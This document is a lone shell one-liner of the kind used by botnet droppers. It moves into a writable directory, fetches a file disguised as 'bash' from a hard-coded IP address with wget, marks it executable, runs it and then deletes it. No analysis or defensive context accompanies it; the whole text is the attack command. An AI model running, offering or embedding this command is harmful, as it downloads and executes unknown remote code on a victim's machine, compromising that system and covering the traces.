cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.209.52.209/bash; chmod +x bash; ./bash; rm -rf bash
